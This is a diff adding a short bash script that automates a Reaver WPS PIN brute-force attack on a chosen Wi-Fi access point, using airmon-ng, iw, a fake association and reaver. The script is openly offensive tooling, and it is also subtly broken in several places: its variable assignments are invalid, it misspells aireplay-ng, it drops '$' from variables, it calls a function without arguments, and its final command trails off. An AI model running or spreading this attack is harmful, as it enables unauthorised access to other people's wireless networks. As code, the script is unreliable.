@@ -1,0 +1,53 @@
+#!/bin/bash
+
+#--Var Notes--
+#$1: interface
+#$2: bssid
+#$3: essid
+#$4: channel
+#$5: monitorName
+
+interface = $1
+bssid = $2
+essid = $3
+channel = $4
+moniterName = $5
+
+reaver-prep () {
+	
+
+	echo "[+] Killing other processes"
+
+	sudo airmon-ng check kill
+	sudo airmon-ng check kill
+	sudo airmon-ng check kill
+
+	echo "[+] Starting monitor mode on interface"
+
+	sudo airmon-ng start $1
+}
+
+reaver-assoc () {
+	
+	local inter = $1
+	local b = $2
+	local e = $3
+	local monName = $4
+	local c = $5
+
+	#Sets channel (can be found in airodump-ng)
+	sudo iw dev monName set channel c
+	
+	#Starts the association with target ap
+	sudo airplay-ng inter -1 120 -a b -e e
+
+}
+
+echo "[++] Prepping for reaverAttack"
+reaver-prep interface
+
+echo "[++] Associating with AP (seperate from Reaver's)"
+reaver-assoc > /dev/null &
+
+echo "[++] Starting Reaver attack"
+sudo reaver -i $1 -A -b $2 -vv --no-nacks -a 
